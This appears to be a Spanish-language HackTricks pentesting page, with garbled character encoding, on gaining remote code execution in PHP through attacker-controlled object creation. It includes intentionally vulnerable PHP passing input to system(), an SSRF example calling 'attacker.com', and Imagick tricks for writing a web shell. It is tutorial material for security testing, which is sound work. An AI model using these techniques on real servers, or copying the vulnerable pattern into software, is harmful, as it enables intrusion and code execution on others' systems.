# PHP - RCE abusando de la creaciÃ³n de objetos: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- ObtÃ©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## IntroducciÃ³n

En la situaciÃ³n en la que se puede crear un nuevo objeto arbitrario como `new $_GET["a"]($_GET["a"])`, es posible obtener RCE, y [**este artÃ­culo**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) expone diferentes formas de obtener RCE.

## RCE a travÃ©s de clases personalizadas o autoloading

En la construcciÃ³n `new $a($b)`, la **variable `$a` representa el nombre de la clase** para la que se crearÃ¡ el objeto, y la variable **`$b` representa el primer argumento** que se pasarÃ¡ al constructor del objeto.

Si `$a` y `$b` provienen de GET/POST, pueden ser **cadenas o matrices de cadenas**. Si provienen de **JSON** u otro lugar, **pueden tener otros tipos**, como objeto o booleano.

Consideremos el siguiente ejemplo:
```php
class App {
    function __construct ($cmd) {
        system($cmd);
    }
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
    function App2 ($cmd) {
        system($cmd);
    }
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
En este cÃ³digo, puedes establecer `$a` en `App` o `App2` y `$b` en `uname -a`. DespuÃ©s de esto, se ejecutarÃ¡ el comando `uname -a`.

Cuando no hay clases explotables en tu aplicaciÃ³n, o tienes la clase necesaria en un archivo separado que no estÃ¡ incluido en el cÃ³digo vulnerable, puedes echar un vistazo a las funciones de carga automÃ¡tica.

Las **funciones de carga automÃ¡tica** se establecen registrando devoluciones de llamada a travÃ©s de `spl_autoload_register` o definiendo `__autoload`. Se llaman cuando se intenta crear una instancia de una clase desconocida.
```php
# An example of an autoloading function
spl_autoload_register(function ($class_name) {
        include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
        include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();
```
Dependiendo de la versiÃ³n de PHP y el cÃ³digo en las funciones de carga automÃ¡tica, pueden existir algunas formas de obtener una EjecuciÃ³n Remota de CÃ³digo a travÃ©s de la carga automÃ¡tica.

## RCE a travÃ©s de Clases Integradas

Cuando no se tienen clases personalizadas y carga automÃ¡tica, se puede depender solo de **clases integradas de PHP**.

Existen de 100 a 200 clases integradas de PHP. El nÃºmero de ellas depende de la versiÃ³n de PHP y las extensiones instaladas. Todas las clases integradas se pueden listar a travÃ©s de la funciÃ³n `get_declared_classes`, junto con las clases personalizadas:
```php
var_dump(get_declared_classes());
```
Las clases con constructores Ãºtiles se pueden encontrar a travÃ©s de [la API de reflexiÃ³n](https://www.php.net/manual/en/book.reflection.php).

Para mostrar los constructores y sus parÃ¡metros usando la API de reflexiÃ³n: [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)\


![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/2.png)

Si controlas **mÃºltiples parÃ¡metros del constructor y puedes llamar a mÃ©todos arbitrarios** despuÃ©s, hay muchas formas de obtener una EjecuciÃ³n de CÃ³digo Remoto. Pero si solo puedes pasar **un parÃ¡metro y no tienes ninguna llamada** al objeto creado, hay **casi nada**.

Conozco solo tres formas de obtener algo de `new $a($b)`.

### **SSRF + deserializaciÃ³n de Phar**

La clase `SplFileObject` implementa un constructor que permite la conexiÃ³n a cualquier URL local o remota:
```
new SplFileObject('http://attacker.com/');
```
Esto permite SSRF. AdemÃ¡s, las SSRF en PHP < 8.0 podrÃ­an convertirse en deserializaciones mediante tÃ©cnicas con el protocolo Phar.

### **Explotando PDOs**

La clase PDO tiene otro constructor interesante:
```php
new PDO("sqlite:/tmp/test.txt")
```
El constructor de `PDO` acepta cadenas DSN, lo que nos permite **conectarnos a cualquier base de datos local o remota** utilizando las **extensiones de base de datos instaladas**. Por ejemplo, la extensiÃ³n SQLite puede crear archivos vacÃ­os.

### **SoapClient/SimpleXMLElement XXE**

En PHP â‰¤ 5.3.22 y â‰¤ 5.4.12, el constructor de SoapClient era **vulnerable a XXE**. El constructor de SimpleXMLElement tambiÃ©n era vulnerable a XXE, pero requerÃ­a libxml2 < 2.9.

## RCE a travÃ©s de la extensiÃ³n Imagick

Al verificar las **dependencias** del **proyecto** que intenta explotar, puede encontrar **nuevas clases** que se pueden **abusar para ejecutar comandos** creando un nuevo objeto. En este caso, se descubriÃ³ que **Imagick** era Ãºtil para ese propÃ³sito.

### Analizador VID

El analizador VID permite escribir contenido arbitrario en una ruta arbitraria dentro del sistema de archivos, lo que permitirÃ­a a un atacante escribir un PHPshell en una carpeta accesible desde la pÃ¡gina web y obtener RCE.

![](<../../../.gitbook/assets/image (157) (3).png>)

#### Analizador VID + Carga de archivos

Cuando se carga un archivo en PHP, se almacena temporalmente en `/tmp/phpXXXXXX`. El analizador VID de Imagick con el protocolo **msl** permite **especificar comodines en las rutas de archivo** (para que el archivo cargado temporalmente se pueda acceder fÃ¡cilmente) y **copiarlo a cualquier ubicaciÃ³n arbitraria**.\
Esta es otra forma de obtener escritura de archivos arbitraria dentro del sistema de archivos:

![](<../../../.gitbook/assets/image (159).png>)

### PHP Crash + Fuerza Bruta

El [**informe original**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) explicaba otra forma de obtener RCE mediante **la carga de archivos con contenido especÃ­fico** y haciendo que el **servidor se bloquee antes de eliminar** ese archivo y luego **realizando un ataque de fuerza bruta al nombre** del archivo temporal hasta que **Imagick ejecute cÃ³digo PHP arbitrario**.

Sin embargo, aparentemente el **truco de bloqueo** descubierto solo **funcionÃ³ en una versiÃ³n antigua de ImageMagick**.

## Referencias

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- ObtÃ©n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
